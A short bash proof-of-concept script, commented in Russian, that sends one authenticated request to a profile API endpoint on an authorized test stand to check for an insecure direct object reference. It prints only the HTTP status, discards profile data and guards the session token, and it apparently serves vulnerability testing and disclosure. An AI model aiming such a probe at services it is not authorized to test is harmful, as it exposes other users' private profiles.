#!/usr/bin/env bash
# Один запрос к разрешённому стенду. Ответ с данными профиля не печатается.
set -euo pipefail
: "${BASE_URL:?Укажите BASE_URL разрешённого тестового стенда}"
: "${SESSION_TOKEN:?Укажите SESSION_TOKEN тестового аккаунта в окружении}"
if [[ $# -ne 1 || ! "$1" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    echo "Использование: bash poc/idor_profile.sh ПУБЛИЧНЫЙ_ИДЕНТИФИКАТОР" >&2
    exit 1
fi
if [[ "$BASE_URL" != https://* && "$BASE_URL" != http://127.0.0.1:* && "$BASE_URL" != http://localhost:* ]]; then
    echo "Требуется HTTPS либо локальный стенд" >&2; exit 1
fi
# Заголовок передаётся через stdin, чтобы секрет не попал в аргументы curl.
if [[ "$SESSION_TOKEN" == *$'\r'* || "$SESSION_TOKEN" == *$'\n'* ]]; then exit 1; fi
printf 'Cookie: x-session-token=%s\n' "$SESSION_TOKEN" | \
    curl --silent --show-error --max-time 10 --output /dev/null \
    --write-out 'Код HTTP: %{http_code}\n' --header @- \
    "${BASE_URL%/}/api/profile/$1"
